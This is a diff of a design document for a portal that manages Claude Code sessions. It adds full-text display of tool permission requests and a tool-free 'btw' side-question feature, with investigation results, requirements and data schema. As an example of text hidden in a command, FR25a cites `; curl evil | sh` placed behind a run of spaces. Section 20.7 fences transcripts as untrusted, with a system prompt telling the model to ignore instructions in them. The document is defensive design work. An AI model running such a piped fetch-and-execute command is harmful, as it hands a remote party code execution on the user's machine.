@@ -200,10 +200,11 @@ adds a way to kill the session).
 | ID | Requirement |
 | --- | --- |
 | FR21 | Every request reaches the portal: sessions always launch with the stdio prompt host, without which Claude Code silently denies prompts and drops AskUserQuestion and the plan tools ✅ (S5b). |
-| FR22 | A permission request ✅ becomes a card in the dock (§12.3): tool, plain question ("Run this command?"), preview (command, diff, URL, MCP arguments; `browser_navigate` shows the address, "Open github.com/login?"), reason, the asking subagent, Deny and Allow. While it's docked the composer answers it: the placeholder reads "Or tell Claude what to do instead", and Send becomes "Deny & send" (deny, with the text as the note). ⋯ adds "Always allow in this session", hidden under Settings' managed-rules lock. Answers follow §10.3. Answered cards collapse to "Allowed once · npm test", "Allowed from Alfian's laptop · 14:02" or "No longer needed · the task was stopped". |
+| FR22 | A permission request ✅ becomes a card in the dock (§12.3): tool, plain question ("Run this command?"), preview (the whole text asked about, FR25a; `browser_navigate` shows the address, "Open github.com/login?"), reason, the asking subagent, Deny and Allow. While it's docked the composer answers it: the placeholder reads "Or tell Claude what to do instead", and Send becomes "Deny & send" (deny, with the text as the note). ⋯ adds "Always allow in this session", hidden under Settings' managed-rules lock. Answers follow §10.3. Answered cards collapse to "Allowed once · npm test", "Allowed from Alfian's laptop · 14:02" or "No longer needed · the task was stopped". |
 | FR23 | Allow is never focused, Enter never approves, nothing approves on swipe, offline disables the buttons, and the first answer per request wins. A card that appears or is stepped to ignores input for 500 ms while it fades in; after an answer, the outcome shows for about 600 ms before the next card; Allow never lands where Send or ✕ was. |
 | FR24 | AskUserQuestion becomes a question card (2–4 options, single or multiple) whose own answer is the composer ("Type your own answer"; Send reads "Answer"); ExitPlanMode a plan card ("Approve, accept edits", "Approve, ask before edits", "Keep planning"); a Workflow call a card with a token caution 🔬. Simple MCP elicitation forms become question cards; others are declined 🔬. |
 | FR25 | Requests never expire in the portal 🔬 (Q2), handoffs aside (FR45). A waiting one sets Needs input and feeds the Web app's attention service, as failed turns do: list order, nav and app badges, the tab title ("(2) Sessions · <name>"), push (Web app §11: Needs input; Failed for a failed turn), and inside a session the back button's count ("‹ 2"). A session gets no toast for its own requests while on screen. `?request=<id>` opens the dock on that request, never focusing Allow. Portal MCP answers only with its session-control switch on; allows need admin scope and a confirmation (its §13.3). |
+| FR25a | **What is approved is shown whole, and nothing is allowed that was not.** The portal keeps up to 8,000 characters of what a tool request asks to run (`chat_requests.full`, and `full_cut` when it was cut; migration 190), beside the 200-character summary in `detail`, which stays the card's one-line title and the transcript row. For Bash it is the command exactly as it will run, not folded, so `; curl evil \| sh` behind a run of 150 spaces is still there; for the file tools the path (not the contents: the Diff panel shows what changed); for the others the URL, query, pattern or description, and the plan of ExitPlanMode; for any other tool, an MCP tool say, or a known one whose field is not in its input (Claude Code renamed it), its whole input as JSON, so that whatever it is asked to run is in front of the person. It is redacted whole before it is cut, so a cut never splits a credential, and control, bidirectional and invisible characters are shown as `⟦U+202E⟧`. The card (FR22) and the [glance widget](glance-widgets.md) §10.6 show it in a monospace block that wraps and scrolls. Allow and Allow for session are offered only when the text is there and whole, and pressable only once the block has been read to its end when it does not fit; a request cut at the cap, or with no text (one asked before the column existed), can be denied and nothing else, with one line saying why ("Too long to show in full.", "Nothing to show for this request."). `controller.respond` refuses an Allow for such a request whoever sends it (409 `CONFLICT`: the card, the widget, Portal MCP, a tab that is out of date). Bypass, its confirmation and its re-check are untouched, and an approval rule must match this full input, never the summary. ✅ Built; checked with a real Claude Code 2.1.296 against a scripted stand-in: a six-line command with the 150-space run showed whole in the card and the widget, Deny and Allow from the widget reached Claude Code (`denied`, then `allowed_once` and the command ran). 🔬 The cap (8,000) and a plan longer than it (Q9 of [Glance widgets](glance-widgets.md)). |
 | FR45 | **Handoffs.** A Browser & desktop `browser_handoff` call (a long-running MCP call, not a permission request) becomes a `handoff` request and a dock card laid out like FR22 ([Browser & desktop](browser-desktop-pool.md) §15.4): "Browser", the checked origin's question, the agent's quote as untrusted text, Decline, and Take control, which opens the live view already in control. It sets Needs input and keeps the session awake; it clears when the call returns, Stop cancels it, and after 10 minutes of waiting (paused while someone has control) it expires: "The agent stopped waiting at 14:12", with Take control anyway and Open chat. |
 
 ### Multi-agent monitoring
@@ -268,7 +269,7 @@ In the portal database ([Pools foundation](foundation-pools.md) §4); redacted (
 | `chat_session_aliases` | alias_id, session_id: the id of a session folded into another, so old links resolve |
 | `chat_events` | session_id, seq, at, type, subtype, uuid (unique per session), parent_tool_use_id, task_id, request_id, payload (json: allowlisted fields only; base64 moved to blobs; over 256 KB to the blob store with a preview and `truncated: true`) |
 | `chat_inputs` | Every line the controller sends: uuid or request_id, session_id, actor (device or MCP token), kind (`message` \| `control`), priority, state (`sending`, `queued`, `started`, `completed`, `cancelled`, `discarded`, `refused`, `failed`), attachments (blob refs), created_at |
-| `chat_requests` | session_id, request_id, tool_use_id, kind (`tool`, `question`, `plan`, `workflow`, `elicitation`, `handoff`), tool_name, agent_label, created_at, answered_at, decision (json), outcome (`allowed_once`, `allowed_session`, `denied`, `withdrawn`, `expired`), actor |
+| `chat_requests` | session_id, request_id, tool_use_id, kind (`tool`, `question`, `plan`, `workflow`, `elicitation`, `handoff`), tool_name, agent_label, title, detail (200 characters), full and full_cut (the whole text asked about, up to 8,000 characters, FR25a), created_at, answered_at, decision (json), outcome (`allowed_once`, `allowed_session`, `denied`, `withdrawn`, `expired`), actor |
 | `chat_tasks` | session_id, task_id, parent_task_id, tool_use_id, type, label, background, status, tokens, tool_uses, last_tool, started_at, ended_at |
 | `chat_files` | session_id, kind (`upload` \| `tool_image` \| `download`), blob_sha256, name, workspace_path (where an upload was staged or an artifact was made: shown and audited, never read back), size, media_type (the sniffed one), width, height, event_seq (the transcript event it belongs to), meta (json: preview, reach, source, redacted), at |
 | `chat_uploads` | id, session_id, blob_sha256, name, media_type, size, meta, created_at: a file uploaded and waiting for its message (dropped after an hour) |
@@ -676,3 +677,159 @@ but attention.
 | Q16 | Are 30 minutes of idle sleep, 64 MB segments, 90 days of session data, C1's caps of 2 and 10, and the 600 MB admission estimate right? | Operator |
 | Q17 | Should a later version run sessions on API keys or cloud credentials a user set up, with an audited admin attestation per workspace, or wait until Account Pool delivers cloud-provider endpoints? | Product, Operator |
 | Q18 | 🔬 What runs in an untrusted folder under `-p`: project `.mcp.json` servers (documented), project hooks and project-enabled plugins (Secrets & env Q11, Persona Q14)? | Sandbox test (C0) |
+
+## 20. Side questions (btw)
+
+| | |
+| --- | --- |
+| Status | **Server built, UI not yet** (S1, 2026-10-12). The investigation, the contract (`packages/contracts/src/chatBtw.ts`), the engine, usage rows, pin, authorization and the tests are built and were run against the real Claude Code and a real portal (§20.9). The UI is the web agent's (§20.10). |
+| Depends on | §10 (the host and the stream protocol), §13 (redaction), [Workspace Claudes](workspace-claudes.md) (a session's Claude and its sign-in), [Claude usage](claude-usage.md) (the usage rows), [Authorization](authorization.md) (`can`, actors) |
+| Owner's words | "Add btw to the session chat, like `/btw` in Claude Code: a separate Claude instance that sees the session so far, without tools, one answer; it must not disturb a running turn, change the session or add to its history; a card that can be closed, with Pin; quota and cost marked as estimates; a rate limit; the reason when it fails. First test whether the real CLI supports it in the stream-json mode the portal uses; if not, build it." (2026-10-12) |
+
+### 20.1 What it is
+
+One question about the session, asked while the agent works, idles, sleeps or after it ended. A SEPARATE Claude Code run with every tool off answers it once from the session's redacted transcript up to that moment. The answer is a temporary card for the person who asked; **Pin** copies the question and answer into the transcript as one card. Nothing else is written: not the session's running turn, queue, counters, usage totals, transcript or Claude's context. A follow-up is a new btw.
+
+Goals: cheap and safe to ask at any time; the person sees what it cost (an estimate) and why it failed. Non-goals: tools or actions of any kind; a conversation (no thread, no history of earlier btws is sent); answering from files the transcript doesn't show; a replacement for a message to the agent (a btw never reaches it).
+
+### 20.2 Investigation: does the real Claude Code do /btw in the portal's stream-json mode?
+
+**Method.** Claude Code `2.1.296 (Claude Code)`, the one on the dev machine and the one in `claudepilot-workspace:latest` (both print that version), started with the portal's flags (`-p --input-format stream-json --output-format stream-json --verbose --include-partial-messages --replay-user-messages --permission-prompt-tool stdio --permission-mode default --session-id <uuid>`), a private `HOME` and `CLAUDE_CONFIG_DIR`, and `ANTHROPIC_BASE_URL` on a scripted stand-in for the Messages API that logs every request (no real credential, no network). What the stand-in cannot show (a real model's behaviour, real cache hits) is marked "inferred". The harness and raw outputs stay in the build's scratch area; the facts the design rests on are re-checked by `apps/server/src/chat/btw.integration.test.ts` (§20.9), so a new pinned CLI version re-tests them.
+
+**Results.**
+
+| # | Question | Observed |
+| --- | --- | --- |
+| 1 | `/btw <q>` as the text of a stream-json user line? | **No.** The CLI answers it locally, with no API call: `assistant ["/btw isn't available in this environment."]`, then `result/success … result="/btw isn't available in this environment." dur=13 usage={input_tokens:0, output_tokens:0}`; the stand-in saw no request. It would also show in the main stream as an assistant message and a result, like a turn. (`/btw` is an interactive-only command; `-p` has no flag for it.) |
+| 2 | Is the feature there at all in this mode? | **Yes, as a control request** (the Agent SDK's `askSideQuestion`): `{"type":"control_request","request_id":…,"request":{"subtype":"side_question","question":"…","history":[{"question":"…","response":"…"}]}}` answers `system/control_request_progress {status:"started"}` then `control_response {subtype:"success", response:{response:"SIDE-ANSWER to: …", synthetic:false}}`; `control_cancel_request` ends it with `control_response error "Side question cancelled"` and the process stays healthy. |
+| 3 | Does it disturb the main session? | Not the turn: with the stand-in holding the main request mid-stream it answered in 28 ms while the turn stayed held, which then finished on its own; with a tool call awaiting approval it saw the call as `[No result yet — this call is still in progress in the main conversation (running, awaiting approval, or queued)]`. Not the session file (its size did not change during the call) and the next main request carries no trace of it. |
+| 4 | Is it cheap? | Cache-sharing: its request has the same `tools` and `system` as the main request and the main messages as its prefix (compared byte for byte in the stand-in's log), so with a warm cache it reads the cache (inferred). |
+| 5 | Are the tools off? | **Denied, not absent.** Its request still carries all 23 tool definitions (that is how it shares the cache); a call is refused after the fact: `(The model tried to call Bash instead of answering directly. Try rephrasing or ask in the main conversation.)` `synthetic:true`, nothing ran. But a `PreToolUse` hook configured in the user's settings **did run** on that denied attempt (`hook.log: pre-1791783793`; `PostToolUse` did not). |
+| 6 | What does it cost, and where does that show? | Its usage is added to the process's running totals and not reported: after one side question `get_session_cost` went from `$0.0066 (40 output)` to `$0.0084 (73 output)`, and the next turn's `result.modelUsage` carried it (`inputTokens 2430 = 1200 + 30 + 1200`) while `result.usage` did not. The portal's per-turn rows are the change in `modelUsage` (§9), so the side question would land in the next turn's row, in `total_cost_usd` and in `--max-budget-usd`. The reply has no usage field. |
+| 7 | How does it fail? | As text and slowly. 529: after two retries `synthetic:true` with `(API error: Repeated 529 Overloaded errors. … check your inference gateway (127.0.0.1:41919).)`, a raw host inside an "answer". 429 and 401: `api_retry` attempts 1 to 10 (delays 1 s, 1 s, 2.4 s, 4.5 s, 8.7 s, 17.6 s, …), not finished after 30 s. |
+| 8 | Without a live process? | Not available: a sleeping or ended session has none. |
+
+**Candidates** for the separate run, compared on the same stand-in:
+
+| | Native `side_question` on the session's process | Fork: `--resume <id> --fork-session --tools "" --no-session-persistence` | Fresh run fed the portal's redacted transcript |
+| --- | --- | --- | --- |
+| Context | the live conversation, in-flight turn included | the session file: whole, completed messages only | the stored events: bounded, up to the last stored message |
+| Tools | offered (23) and denied; a user hook fired | none: `init.tools=[]`, request `tools=0` | none: `init.tools=[]`, `mcp_servers=[]`, `slash_commands=0` |
+| Writes | `.claude.json` counters only | none: no new file, the original byte-identical (sha1 unchanged) | none |
+| Cache | shared | none: `tools` (first in the cache order) differs from the main's 23 | none |
+| Cost bound | none: the whole context, uncached when the cache is cold | none: the whole session, every time | **bounded** by the context limit (§20.3) |
+| Usage | folded into the process's totals, not reported | its own `result` | its own `result`: `total_cost_usd 0.00178`, `usage {input 30, cache_read 5000, output 33}` in the stand-in run |
+| Redaction before sending | impossible (the CLI holds the context) | impossible (the CLI loads its own file) | by construction |
+| Needs | the live process | the session file in that Claude's directory, same folder | nothing but a running workspace |
+
+**Decision: the fresh run.** It is the only candidate that satisfies W1 to W4 as written (tools absent and provable, session and usage totals untouched, exact usage, redacted before sending), works for every session whatever its state, and has a bounded cost. The fork is kept as the reference it was compared with; the native request is documented, **not built** (§20.11 says what adding it would take). The coordinator's engine rule also says never through the long-lived process.
+
+**How "no tools" is proven.**
+- The flags give the model nothing to call: `--tools ""` (the request carries no `tools`: the stand-in's log shows `tools=0`), `--strict-mcp-config` with no config, `--disable-slash-commands`, `ENABLE_CLAUDEAI_MCP_SERVERS=false`, and `--safe-mode`, which also leaves out hooks, CLAUDE.md, skills and plugins: with a `SessionStart`, `UserPromptSubmit`, `PreToolUse`, `PostToolUse` and `Stop` hook configured, **none ran** under `--safe-mode`, while without it `SessionStart, UserPromptSubmit, Stop` ran.
+- Every run's `system/init` is read before anything is shown: `tools` and `mcp_servers` must be empty, or the run is stopped and the btw fails as `unsafe` (a guard that should never fire; a test makes the stand-in report a tool). An answer that contains a `tool_use` block is dropped the same way.
+- No session file is written (`--no-session-persistence`). The first Claude Code run in a workspace creates the CLI's own first-start config (`~/.claude.json` and a backup of it); after that, a btw run changes no file at all: the home folder's file hashes are identical before and after (checked in the image, §20.9).
+
+### 20.3 How it works
+
+1. **Ask** (`btw_ask`, chat socket). Refused with an `ack` when malformed (empty, over 2 000 characters), the session is unknown or the person may not operate it. Otherwise a `btw` message follows at once: `running`, or `failed` with a reason (`disabled`, `busy`, `rate_limit` with `retryAfterMs`, `no_quota`, `signed_out`, `workspace`).
+2. **Gates, in order**: the setting is on; one btw in flight per session; the per-session limit (default 6 starts in 10 minutes); the portal's own spending gate (`sendGate`: a paused budget); the session's Claude is signed in or its pool is set up (the same check a start uses); the workspace answers.
+3. **Context** (`chat/btwContext.ts`): the session's stored events up to now, newest whole messages first until the limit (default 60 000 characters): what the person sent, Claude's replies, each tool call as its name and one-line summary and a short excerpt of its result. Left out: thinking, sub-agent lines, system notes, pinned btw cards. Redacted by the chat's two redactors (credential shapes, and the workspace's secret values) **before** anything is sent, then fenced as data (`<session_transcript>`; a literal closing tag in it reads as text). The question stays outside the fence.
+4. **Run** (`chat/btwRun.ts`), through the same `exec` the other host commands use, in a neutral folder (`$HOME`: no project settings are even candidates), under `env -i` plus `HOME`, `PATH`, the proxy variables and the session's Claude's `CLAUDE_CONFIG_DIR` (the session's own sign-in; for a pool, the managed helper), never through the session's process or FIFO: `timeout <limit+5> claude -p --input-format stream-json --output-format stream-json --verbose --include-partial-messages --tools "" --safe-mode --no-session-persistence --disable-slash-commands --strict-mcp-config --permission-mode default --effort low --max-budget-usd 0.5 --system-prompt <fixed> [--model <the session's>]`, the transcript and question as one user line on stdin.
+5. **Answer**: text deltas go through the session's streaming redactor (a tail that could become a secret waits for the next delta) to the asking person's tabs as `btw_delta`; the final text, redacted again whole and cut at 12 000 characters, is the card's. The `result` gives the usage.
+6. **End**: `answered`, `cancelled` (the person's cancel or close: `interrupt`, then the exec is closed; the workspace's `timeout` is the backstop), or `failed` with one reason code. The first retry notice of a 401 or 403 (`signed_out`) or 429 (`api_limit`) and the second of a 5xx (`overloaded`) stop the run at once instead of waiting out the CLI's ten retries; the portal's own limit (default 60 s) is `timeout`.
+7. **Usage**: one `chat_usage` row, `kind = 'side'`, per run that reached the API (§20.6), through `onSideUsage` (not `onUsage`); the result's numbers, labelled estimates.
+8. **Pin** (`btw_pin`): one `system` event with `btw`, from what the portal kept (never from the tab), once, by the person who asked.
+9. **Close** (`btw_close`): stops a running one and hides the card; a refusal (never stored) is closed on the person's other tabs by a bare `closed` snapshot.
+
+### 20.4 Requirements
+
+| ID | Requirement | Status |
+| --- | --- | --- |
+| BTW1 | **Separate, tool-free run.** Each btw is one `claude -p` run in the session's workspace with the flags of §20.3; never the session's process; `init.tools` and `mcp_servers` empty or the btw fails `unsafe`; no session file written. | Not built |
+| BTW2 | **The session is untouched.** No line to the session's FIFO; no event (unless pinned); no change to its state, counters, queue, turn cost or the meaning of its usage totals; works while the agent works, sleeps or has ended (the workspace must run). | Not built |
+| BTW3 | **Context** as §20.3 step 3: bounded, redacted before sending, fenced as data, newest first; the card says how many messages it saw and whether older ones were left out. | Not built |
+| BTW4 | **One at a time, rate limited, timed.** One btw in flight per session (`busy`); N starts per window per session (`rate_limit` with `retryAfterMs`); a time limit (`timeout`). Refusals don't count toward the limit. | Not built |
+| BTW5 | **Cancel and close** stop the run at once (interrupt, close, backstop `timeout`); nothing keeps running or spending. | Not built |
+| BTW6 | **Reasons**, never raw API text: `rate_limit`, `busy`, `no_quota`, `api_limit`, `signed_out`, `overloaded`, `timeout`, `workspace`, `unsafe`, `empty`, `disabled`, `error` (`BTW_REASON_TEXT`). Fail fast on the first 401/403/429 notice. | Not built |
+| BTW7 | **Estimates.** Tokens (in, out, cache) and `costUsd` from the run's own report, always `estimate: true`; before it reports, a size-based token estimate with no cost. | Not built |
+| BTW8 | **Usage honesty.** One `chat_usage` row per run that reached the API, `kind = 'side'`, `ref` = the btw id; counted in every total, budgets and the Usage report; reports may split by `kind`. Never a turn: no `result`, no session cost. | Not built |
+| BTW9 | **Pin**: one `system` event with `btw` (question, answer, model, asker, usage); only an answered btw of the asker, once; from the portal's copy. Claude never sees it; a later btw's context leaves it out. | Not built |
+| BTW10 | **Redaction and untrusted text.** Context and answer pass the chat's redactors (shapes and the workspace's secret values, streaming hold-back); the transcript is data; the answer is shown as the chat's safe markdown and can trigger nothing. | Not built |
+| BTW11 | **Authorization and privacy.** A btw needs `operate` on its session (`can`); its messages go only to the asking person's tabs; only the asker may cancel, close or pin it; a shared session shares a pinned card, never an open one. | Not built |
+| BTW12 | **Settings and audit.** `chat.btw.enabled`, `.limit`, `.windowMin`, `.timeoutSec`, `.contextChars`, `.model`, `.maxCostUsd`; the audit trail records each btw's outcome and each pin with `actorString(actor)`, ids and numbers only. | Not built |
+| BTW13 | **Recovery.** A btw left `running` by a restart becomes `failed` (`error`); a tab that subscribes gets the person's open btws of the last hour (`btw` messages). | Not built |
+
+### 20.5 Protocol
+
+Client → portal (added to `ChatClientMessage`): `btw_ask {session, btw, question}`, `btw_cancel {session, btw}`, `btw_close {session, btw}`, `btw_pin {session, btw, uuid}`. Portal → the asking person's tabs (added to `ChatServerMessage`): `btw {session, item: ChatBtw}` (the whole state: at the start, at every change, at the end and on subscribe), `btw_delta {session, btw, text, seq}`. A refusal that creates no btw is an `ack {uuid: btw, ok: false, error, code}`; a pin is answered by an `ack` keyed by its `uuid` and then the card arrives as a stored event (`events`) for everyone subscribed. Types, limits and reason texts: `packages/contracts/src/chatBtw.ts`.
+
+### 20.6 Data
+
+```sql
+CREATE TABLE chat_btw (
+  id TEXT NOT NULL, session_id TEXT NOT NULL,
+  user_id TEXT NOT NULL DEFAULT 'u_owner', created_by TEXT NOT NULL DEFAULT 'u_owner', actor TEXT NOT NULL DEFAULT 'user:u_owner',
+  workspace_id TEXT NOT NULL, claude_id TEXT NOT NULL DEFAULT '',
+  question TEXT NOT NULL, answer TEXT NOT NULL DEFAULT '',
+  status TEXT NOT NULL CHECK (status IN ('running','answered','failed','cancelled')), reason TEXT, note TEXT, retry_after_ms INTEGER,
+  model TEXT, ctx_messages INTEGER, ctx_truncated INTEGER, ctx_last_seq INTEGER, ctx_chars INTEGER,
+  input_tokens INTEGER NOT NULL DEFAULT 0, output_tokens INTEGER NOT NULL DEFAULT 0, cache_read_tokens INTEGER NOT NULL DEFAULT 0,
+  cache_write_tokens INTEGER NOT NULL DEFAULT 0, cost_usd REAL, basis TEXT,
+  pinned_seq INTEGER, closed INTEGER NOT NULL DEFAULT 0,
+  asked_at TEXT NOT NULL, asked_ms INTEGER NOT NULL, settled_at TEXT,
+  PRIMARY KEY (user_id, session_id, id)
+) STRICT;
+ALTER TABLE chat_usage ADD COLUMN kind TEXT NOT NULL DEFAULT 'turn';  -- 'side' for a btw
+ALTER TABLE chat_usage ADD COLUMN ref TEXT;                          -- the btw's id
+```
+Rows go with their session (they hold its content); the usage rows stay, like every usage row. `user_id` and `created_by` default to the founding user (`u_owner`): the multi-user retrofit stamps `chat_usage.user_id` from `chat_btw.user_id` through `ref`.
+
+### 20.7 Security and multi-user
+
+- The transcript is untrusted: fenced, with a system prompt that says to ignore instructions inside it; the model is given no tool to call and the CLI no hook to run; the answer is text the chat renders as safe markdown and nothing executes it. The only path from an answer to the session is the person pressing Pin, and a pinned card is not input to Claude.
+- Secrets: values the workspace was given and credential shapes are taken out of the context before it leaves the portal and out of the answer as it streams (hold-back) and again whole. The question is the person's own text and goes through the shape redactor too. Nothing logs a question, a context or an answer; the audit trail holds ids and numbers.
+- **Multi-user** (docs/prd/multi-user.md): a btw belongs to the person who asked and to the session's owner. It needs `can(actor, 'operate', session)`; its messages are sent only to that person's tabs; `chat_btw` carries `user_id` and `created_by` (default `u_owner`); the audit and usage entries carry `actorString(actor)`; the session is read through one resolver (`chat/authz.ts`). A revoked right cancels the person's running btws (`onAccessChange`).
+- Abuse cases the tests run: another user cannot ask, cancel, close or pin a btw of someone else's session or id; a pin takes no text from the client; a closed or foreign id is `NOT_FOUND`; two users with the same btw id don't collide.
+
+### 20.8 Limits
+
+The answer comes from the stored transcript, not from files or live output: it can say "I can't see that". The newest messages fit; a long session's early ones may not (the card says so). No cache: each btw pays for its whole context at full price (bounded by the context limit and `maxCostUsd`). The in-flight assistant text of a running turn is not in the store yet. The run starts a Claude Code process in the workspace (about a second and a short memory burst): one per session at a time, and rate limited. On a plan the numbers say tokens and a list-price estimate, not quota used. A run that is cancelled, times out or fails before its `result` books no usage row (Claude Code reports none; the card shows a size-based estimate where the request probably went out, and none for a run that never reached the API). Refusals (`busy`, `rate_limit`, the gates) are not stored and do not count toward the limit.
+
+### 20.9 Verification
+
+(Filled in as the work lands: §20.10.)
+
+### 20.10 Milestones and status
+
+| ID | Scope | Status |
+| --- | --- | --- |
+| BW0 | The investigation (§20.2) | **Built:** run on 2026-10-12 against the real CLI; the facts are re-checked by the integration test once it is written |
+| BW1 | Contract (`chatBtw.ts`, the socket unions, `ChatEvent.btw`) | **Built:** typechecks; S2 builds on it |
+| BW2 | Engine, store, settings, pin, usage rows, authorization, socket wiring | Not built |
+| BW3 | Tests (unit, abuse across users, real CLI in Docker) | Not built |
+| BW4 | UI: `/btw` command with suggestions, the composer button, the card, the side panel, the phone sheet, focus and scroll rules, the size matrix (S2, web) | **Built** (§20.12; checked against a scripted socket, not yet against the engine) |
+
+### 20.12 UI (web)
+
+Built by the web agent against `chatBtw.ts` (files: `apps/web/src/features/chat/btw/*`, the slash list and button in `Composer.tsx`, the wiring in `SessionPage.tsx`, the btw state in `useChatSocket.ts`, the pinned card in `Transcript.tsx`).
+
+| ID | Requirement | Status |
+| --- | --- | --- |
+| BV1 | **Trigger.** `/btw <question>` in the composer; typing "/" lists commands (`slash.ts`: a list, so other commands can join; only `/btw` acts, anything else stays a normal message). Enter or Tab completes, arrows move, Esc hides until the text changes. An icon button in the button row (`data-guide="btw"`, accessible name "Ask btw", tooltip "btw", the word "btw" shown from 1024 px): asks what is written, or inserts `/btw ` when the box is empty. Works while a turn runs (Enter on `/btw ...` never steers). One at a time: the button is disabled and Enter says so while one runs. | **Built** (checked against a scripted socket; the engine's socket wiring is S1's) |
+| BV2 | **Card.** One card above the composer, inside the chat column: one-line question (clamped; a cut question is a button that opens it whole, also by keyboard), the answer in its own scroll area (a polite live region, `aria-busy` while it streams), the estimate line ("≈ tokens · ≈ $", an InfoTip says it is not the bill, what the answer saw, and that nothing is added unless pinned), Pin, Ask again, Stop while running, Close. Failure shows the reason line from `BTW_REASON_TEXT` (a retry wait counts down and holds Ask again). The card's height is fixed (the body scrolls): a streaming answer never moves the composer or the transcript. | **Built** |
+| BV3 | **Side panel.** From 1280 px, when the row leaves the chat column at least 560 px, the card offers "Open in side panel": a right panel (it takes the place of the Agents or Files panel while open, never a second column), resizable by its edge (drag or arrow keys, 300 to 560 px), closable, the choice and width remembered per device and per person (`claudepilot.btw.<userId>`). When the width stops allowing it, it returns to the card by itself. | **Built** |
+| BV4 | **Phone sheet.** Under 640 px: a bottom sheet above the composer (the composer stays reachable), half the height, a handle drags it to full height (never over the header) or down to close, Esc closes, with the keyboard up it stays at half. It overlays the transcript without resizing it. | **Built** |
+| BV5 | **Focus and announcements.** Focus moves to the card when the person asks and returns to the composer when it closes (Esc inside the card, Close, swipe). Reduced motion removes the entrance animation (opacity and transform only, 180 to 240 ms otherwise). | **Built** |
+| BV6 | **Scroll.** The card lives in the composer dock, so a pinned transcript keeps its end in view through the existing follower (`useFollow`: the dock growing is a view change, no glide); an unpinned reader's scroll position is not touched by opening, streaming or closing; the sheet and the panel add no padding. | **Built**, measured by BV7 |
+| BV7 | **Automatic layout checks.** `tools/qa/btw-layout.mjs` (+ `btw-fake.js`, a fake chat socket and session routes so the real page runs with a main turn streaming): over 390, phone landscape, 768, 1024, 1280, 1920, light and dark, reduced motion at 1280: no horizontal scroll, the card/sheet/panel never over the composer, the composer on screen with the keyboard emulated, the end in view (pinned) and the scroll unmoved (unpinned) while a long answer streams, the card height and the composer position constant, hostile text (200 characters without spaces, emoji, RTL, a wide table and code) contained, failure and refusal reasons, cancel half-way, Ask again, Pin adds one transcript card, Esc and focus, quick repeats, the panel resized and closed, the sheet's half/full/keyboard states. | **Built** |
+| BV8 | **Real devices.** iOS Safari keyboard and sheet checks are in `platform-roadmap.md` section 9 (merged from the web agent's list). | Not run |
+
+### 20.11 Decisions and open questions
+
+- **D1** The separate fresh run, not the native control request and not the fork (§20.2). The native request would need: the wire format above; a `get_session_cost` read before and after (text, rounded to 0.0001 USD and three digits of tokens) with the next turn's row corrected by the difference; the user-hook caveat accepted; a live process. Revisit if Claude Code reports a side question's usage in its reply and stops running hooks for it.
+- **D2** The context is built from the portal's stored events (not the session file): bounded, redacted, works after a move and on a sleeping session.
+- **D3** The model is the session's own (setting `chat.btw.model` overrides), effort low, output capped, cost capped per run.
+- **D4** A btw is stored (question, answer, numbers) so Pin can use the portal's copy and a reload can show the open card; it is deleted with its session.
+- **D5** Notifications: a btw produces no `result` event and no `onUsage` call, so `session_done` and every turn-keyed adapter stay silent; its usage row has `kind = 'side'` and is announced on `onSideUsage`.
+- **Q-btw-1** Should the card show the quota the plan has left (Claude usage) next to the estimate? Needs the usage module's summary; not built.
+- **Q-btw-2** Should a pinned card be offered to the next btw as context? Not now (a follow-up is a new btw).
